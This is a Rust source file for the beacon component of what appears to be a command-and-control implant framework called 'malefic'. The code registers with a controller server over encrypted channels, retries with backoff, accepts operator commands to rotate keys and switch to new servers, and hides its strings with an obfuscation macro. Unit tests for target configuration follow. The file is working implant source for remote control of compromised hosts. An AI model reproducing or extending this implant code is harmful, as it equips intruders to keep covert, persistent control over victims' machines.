use futures::{pin_mut, FutureExt};
use futures_timer::Delay;
use malefic_stub::channel::MaleficChannel;
use malefic_stub::stub::{build_connection_for_server, connect_timeout_for_server, MaleficStub};
use std::time::Duration;

use malefic_common::debug;
use malefic_config as config;
#[allow(unused_imports)]
use malefic_gateway::obfstr::obfstr;
use malefic_proto::proto::implantpb::Spites;
use malefic_proto::proto::modulepb;
use malefic_transport::{Client, ConnectionRunner, DialerExt, ServerManager, Target};

use crate::session_loop::{enforce_guardrail, BeaconStrategy, SessionError, SessionLoop};

/// Compute the session ID the same way the server does: MD5(instance_id bytes).
/// This allows the REM agent alias to match the server-side session ID exactly.
#[cfg(feature = "transport_rem")]
fn md5_session_id(instance_id: &[u8; 4]) -> String {
    use md5::{Digest, Md5};
    let hash = Md5::digest(instance_id);
    hash.iter().map(|b| format!("{:02x}", b)).collect()
}

pub struct MaleficBeacon {
    pub stub: MaleficStub,
    pub client: Client,
    pub server_manager: ServerManager,
}

#[malefic_gateway::obfuscate]
impl MaleficBeacon {
    pub fn new(instance_id: [u8; 4], channel: MaleficChannel) -> anyhow::Result<Self> {
        #[cfg(all(
            feature = "transport_rem",
            not(feature = "transport_tcp"),
            not(feature = "transport_http")
        ))]
        let client = {
            let session_id = md5_session_id(&instance_id);
            Client::new_with_alias(Some(&session_id)).map_err(|e| {
                debug!("[beacon] Failed to initialize client: {}", e);
                e
            })?
        };

        #[cfg(not(all(
            feature = "transport_rem",
            not(feature = "transport_tcp"),
            not(feature = "transport_http")
        )))]
        let client = Client::new().map_err(|e| {
            debug!("[beacon] Failed to initialize client: {}", e);
            e
        })?;

        let server_manager = ServerManager::new(config::SERVER_CONFIGS.clone());

        Ok(Self::new_with_parts(
            MaleficStub::new(instance_id, channel),
            client,
            server_manager,
        ))
    }

    pub fn new_with_parts(
        stub: MaleficStub,
        client: Client,
        server_manager: ServerManager,
    ) -> Self {
        MaleficBeacon {
            stub,
            client,
            server_manager,
        }
    }

    pub async fn run(&mut self) -> Result<(), ()> {
        #[cfg(debug_assertions)]
        let _defer = malefic_common::errors::Defer::new(obfstr!("[beacon] beacon exit!"));

        loop {
            match self.run_once().await {
                Ok(()) => {
                    self.server_manager.mark_success();
                    self.apply_pending_switch().await;
                }
                Err(SessionError::Transport(_e)) => {
                    debug!("[beacon] Transport error: {:?}", _e);
                    self.apply_pending_switch().await;

                    if !self.server_manager.mark_failure() {
                        debug!("[beacon] All targets exhausted, exiting");
                        return Err(());
                    }

                    let sleep_time = if let Some(backoff) = self.server_manager.backoff_secs() {
                        debug!("[beacon] Backing off, sleeping {}s", backoff);
                        Duration::from_secs(backoff)
                    } else {
                        Duration::from_millis(self.stub.meta.new_heartbeat())
                    };
                    Delay::new(sleep_time).await;
                }
                Err(SessionError::Handler(_e)) => {
                    debug!("[beacon] Handler error: {:?}", _e);
                    let sleep_time = Duration::from_millis(self.stub.meta.new_heartbeat());
                    Delay::new(sleep_time).await;
                }
            }
        }
    }

    pub async fn run_once(&mut self) -> Result<(), SessionError> {
        let server_config = self
            .server_manager
            .current()
            .ok_or(SessionError::Transport(
                malefic_transport::TransportError::ConnectionError,
            ))?
            .clone();

        self.stub
            .apply_server_defaults(server_config.server_config());

        self.register(&server_config)
            .await
            .map_err(SessionError::Transport)?;

        let connection = self
            .establish_connection(&server_config)
            .await
            .map_err(SessionError::Transport)?;

        self.run_session(connection).await
    }

    pub async fn run_session(
        &mut self,
        connection: malefic_transport::Connection,
    ) -> Result<(), SessionError> {
        let mut runner = ConnectionRunner::new(connection);
        let mut session_loop = SessionLoop::new(BeaconStrategy);
        session_loop.run(&mut self.stub, &mut runner).await
    }

    /// Beacon registration: actively connect to server and register.
    /// Uses a separate connection (consumed by exchange) — the server
    /// protocol expects register and session on distinct connections.
    async fn register(&mut self, target: &Target) -> Result<(), malefic_transport::TransportError> {
        enforce_guardrail();
        debug!("[beacon] Current target: {:#?}", target.server_config());

        let transport = self.connect_with_timeout(target).await?;

        let connection = build_connection_for_server(
            transport,
            self.stub.meta.get_uuid(),
            self.stub.meta.get_encrypt_key(),
            self.stub.meta.get_decrypt_key(),
            target.server_config(),
        )
        .map_err(|e| malefic_transport::TransportError::ConnectFailed(e.to_string()))?;

        let register_spites = Spites {
            spites: vec![self.stub.register_spite()],
        };

        connection.send_only(register_spites).await?;
        debug!("[beacon] Registered (send-only)");
        Ok(())
    }

    /// Establish connection
    async fn establish_connection(
        &mut self,
        target: &Target,
    ) -> Result<malefic_transport::Connection, malefic_transport::TransportError> {
        let transport = self.connect_with_timeout(target).await?;

        build_connection_for_server(
            transport,
            self.stub.meta.get_uuid(),
            self.stub.meta.get_encrypt_key(),
            self.stub.meta.get_decrypt_key(),
            target.server_config(),
        )
        .map_err(|e| malefic_transport::TransportError::ConnectFailed(e.to_string()))
    }

    pub async fn apply_pending_switch(&mut self) {
        let pending = match self.stub.take_pending_switch() {
            Some(p) => p,
            None => return,
        };

        let targets = ServerManager::targets_from_proto(&pending.targets);
        if targets.is_empty() {
            debug!("[beacon] Switch ignored: no valid targets");
            return;
        }

        // Verify primary target with a real transport connection (full
        // encryption + protocol handshake).  If a new key is provided we
        // apply it temporarily; on failure we roll it back.
        let primary = &targets[0];
        let old_key = if !pending.key.is_empty() {
            let prev = malefic_config::get_transport_key();
            malefic_config::update_runtime_key(pending.key.clone());
            Some(prev)
        } else {
            None
        };

        if !self.try_register_to(primary).await {
            debug!(
                "[beacon] Switch aborted: primary target {} unreachable via full transport",
                primary.address()
            );
            // Roll back the key change so the current session stays valid.
            if let Some(prev) = old_key {
                malefic_config::update_runtime_key(prev);
            }
            return;
        }
        // Verification succeeded — key stays updated (if changed).

        match modulepb::SwitchAction::try_from(pending.action) {
            Ok(modulepb::SwitchAction::Replace) => {
                debug!("[beacon] Switch REPLACE: {} targets", targets.len());
                self.server_manager.replace_target_entries(targets);
            }
            Ok(modulepb::SwitchAction::Add) => {
                debug!("[beacon] Switch ADD: {} targets", targets.len());
                self.server_manager.add_target_entries(targets);
            }
            Ok(modulepb::SwitchAction::Switch) => {
                let first = targets.into_iter().next().unwrap();
                debug!("[beacon] Switch SWITCH to: {}", first.address());
                self.server_manager.switch_to_target(first);
            }
            Err(_) => {
                debug!(
                    "[beacon] Switch unknown action {}, treating as REPLACE",
                    pending.action
                );
                self.server_manager.replace_target_entries(targets);
            }
        }
    }

    /// Attempt a full transport-level register to a specific target.
    /// Returns true if the register packet was delivered successfully.
    async fn try_register_to(&mut self, target: &Target) -> bool {
        debug!(
            "[beacon] Verifying target via full register: {}",
            target.address()
        );

        let transport = match self.connect_with_timeout(target).await {
            Ok(t) => t,
            Err(_e) => {
                debug!("[beacon] Verify connect failed: {:?}", _e);
                return false;
            }
        };

        let connection = match build_connection_for_server(
            transport,
            self.stub.meta.get_uuid(),
            self.stub.meta.get_encrypt_key(),
            self.stub.meta.get_decrypt_key(),
            target.server_config(),
        ) {
            Ok(c) => c,
            Err(_e) => {
                debug!("[beacon] Verify build_connection failed: {:?}", _e);
                return false;
            }
        };

        let register_spites = Spites {
            spites: vec![self.stub.register_spite()],
        };

        match connection.send_only(register_spites).await {
            Ok(()) => {
                debug!("[beacon] Verify register succeeded: {}", target.address());
                true
            }
            Err(_e) => {
                debug!("[beacon] Verify register send failed: {:?}", _e);
                false
            }
        }
    }

    async fn connect_with_timeout(
        &mut self,
        target: &Target,
    ) -> Result<malefic_transport::InnerTransport, malefic_transport::TransportError> {
        if matches!(
            &target.server_config().transport_config,
            config::TransportConfig::Rem(_)
        ) {
            // REM already enforces its own connect timeout around the
            // handshake/reinitialization path. Avoid stacking a second
            // outer timeout on top of the same operation.
            return self
                .client
                .connect(target)
                .await
                .map_err(|e| malefic_transport::TransportError::ConnectFailed(e.to_string()));
        }

        let connect_timeout = connect_timeout_for_server(target.server_config());
        let connect = self.client.connect(target).fuse();
        let timeout = Delay::new(connect_timeout).fuse();
        pin_mut!(connect, timeout);

        futures::select! {
            result = connect => result.map_err(|e| malefic_transport::TransportError::ConnectFailed(e.to_string())),
            _ = timeout => Err(malefic_transport::TransportError::ConnectFailed(format!(
                "connect timeout after {:?} to {}",
                connect_timeout,
                target.address()
            ))),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use malefic_config::{ProtocolType, ServerConfig, TransportConfig};
    use malefic_proto::proto::modulepb;
    use malefic_transport::ServerManager;

    fn make_target(addr: &str) -> modulepb::Target {
        modulepb::Target {
            address: addr.to_string(),
            ..Default::default()
        }
    }

    #[test]
    fn targets_to_configs_basic_tcp() {
        let targets = vec![make_target("1.2.3.4:5001")];
        let configs = ServerManager::targets_to_server_configs(&targets);
        assert_eq!(configs.len(), 1);
        assert_eq!(configs[0].address, "1.2.3.4:5001");
        assert_eq!(configs[0].protocol, ProtocolType::Tcp);
        assert!(matches!(
            configs[0].transport_config,
            TransportConfig::Tcp(_)
        ));
    }

    #[test]
    fn tcp_connect_timeout_matches_session_deadline() {
        let transport_config = TransportConfig::Tcp(malefic_config::TcpConfig {});
        let config = ServerConfig {
            address: "127.0.0.1:5001".to_string(),
            protocol: ProtocolType::Tcp,
            session_config: malefic_config::SessionConfig::default_for_transport(
                &transport_config,
                false,
            ),
            transport_config,
            tls_config: None,
            proxy_config: None,
            domain_suffix: None,
        };

        assert_eq!(connect_timeout_for_server(&config), Duration::from_secs(3));
    }

    #[test]
    fn targets_to_configs_http() {
        let targets = vec![modulepb::Target {
            address: "10.0.0.1:8080".to_string(),
            protocol: "http".to_string(),
            http_config: Some(modulepb::TargetHttpConfig {
                method: "GET".to_string(),
                path: "/api".to_string(),
                version: "2".to_string(),
                headers: std::collections::HashMap::new(),
            }),
            ..Default::default()
        }];
        let configs = ServerManager::targets_to_server_configs(&targets);
        assert_eq!(configs.len(), 1);
        assert_eq!(configs[0].protocol, ProtocolType::Http);
        match &configs[0].transport_config {
            TransportConfig::Http(http) => {
                assert_eq!(http.method, "GET");
                assert_eq!(http.path, "/api");
                assert_eq!(http.version, "2");
            }
            _ => panic!("expected Http transport config"),
        }
    }

    #[test]
    fn targets_to_configs_rem() {
        let targets = vec![modulepb::Target {
            address: "rem://local".to_string(),
            protocol: "rem".to_string(),
            rem_config: Some(modulepb::TargetRemConfig {
                link: "pipe_name".to_string(),
            }),
            ..Default::default()
        }];
        let configs = ServerManager::targets_to_server_configs(&targets);
        assert_eq!(configs.len(), 1);
        assert_eq!(configs[0].protocol, ProtocolType::REM);
        match &configs[0].transport_config {
            TransportConfig::Rem(rem) => {
                assert_eq!(rem.link, "pipe_name");
            }
            _ => panic!("expected Rem transport config"),
        }
    }

    #[test]
    fn targets_to_configs_tls_explicit_enable() {
        let targets = vec![modulepb::Target {
            address: "1.2.3.4:443".to_string(),
            tls_config: Some(modulepb::TargetTlsConfig {
                enable: true,
                version: "1.3".to_string(),
                sni: "test.com".to_string(),
                skip_verify: false,
            }),
            ..Default::default()
        }];
        let configs = ServerManager::targets_to_server_configs(&targets);
        assert_eq!(configs.len(), 1);
        let tls = configs[0]
            .tls_config
            .as_ref()
            .expect("tls_config should be Some");
        assert!(tls.enable);
        assert_eq!(tls.sni, "test.com");
        assert_eq!(tls.version, "1.3");
        assert!(!tls.skip_verification);
    }

    #[test]
    fn targets_to_configs_tls_none_defaults_disabled() {
        let targets = vec![make_target("1.2.3.4:5001")];
        let configs = ServerManager::targets_to_server_configs(&targets);
        assert_eq!(configs.len(), 1);
        let tls = configs[0]
            .tls_config
            .as_ref()
            .expect("tls_config should be Some");
        assert!(
            !tls.enable,
            "switch targets with no TLS config should default to disabled"
        );
        assert!(tls.skip_verification);
    }

    #[test]
    fn targets_to_configs_filters_empty_address() {
        let targets = vec![make_target(""), make_target("1.2.3.4:5001")];
        let configs = ServerManager::targets_to_server_configs(&targets);
        assert_eq!(configs.len(), 1);
        assert_eq!(configs[0].address, "1.2.3.4:5001");
    }

    #[test]
    fn targets_to_configs_proxy() {
        // With proxy
        let targets = vec![modulepb::Target {
            address: "1.2.3.4:5001".to_string(),
            proxy_config: Some(modulepb::TargetProxyConfig {
                r#type: "socks5".to_string(),
                host: "proxy.com".to_string(),
                port: 1080,
                username: "u".to_string(),
                password: "p".to_string(),
            }),
            ..Default::default()
        }];
        let configs = ServerManager::targets_to_server_configs(&targets);
        let proxy = configs[0]
            .proxy_config
            .as_ref()
            .expect("proxy_config should be Some");
        assert_eq!(proxy.proxy_type, "socks5");
        assert_eq!(proxy.host, "proxy.com");
        assert_eq!(proxy.port, 1080);
        assert_eq!(proxy.username, "u");
        assert_eq!(proxy.password, "p");

        // With empty host → proxy_config is None
        let targets_no_proxy = vec![modulepb::Target {
            address: "1.2.3.4:5001".to_string(),
            proxy_config: Some(modulepb::TargetProxyConfig {
                r#type: "socks5".to_string(),
                host: "".to_string(),
                port: 1080,
                username: "".to_string(),
                password: "".to_string(),
            }),
            ..Default::default()
        }];
        let configs2 = ServerManager::targets_to_server_configs(&targets_no_proxy);
        assert!(
            configs2[0].proxy_config.is_none(),
            "empty proxy host should result in None"
        );
    }

    #[test]
    fn targets_to_configs_domain_suffix() {
        // Non-empty domain_suffix
        let targets = vec![modulepb::Target {
            address: "1.2.3.4:5001".to_string(),
            domain_suffix: "example.com".to_string(),
            ..Default::default()
        }];
        let configs = ServerManager::targets_to_server_configs(&targets);
        assert_eq!(configs[0].domain_suffix.as_deref(), Some("example.com"));

        // Empty domain_suffix → None
        let targets_empty = vec![make_target("1.2.3.4:5001")];
        let configs2 = ServerManager::targets_to_server_configs(&targets_empty);
        assert!(configs2[0].domain_suffix.is_none());
    }
}
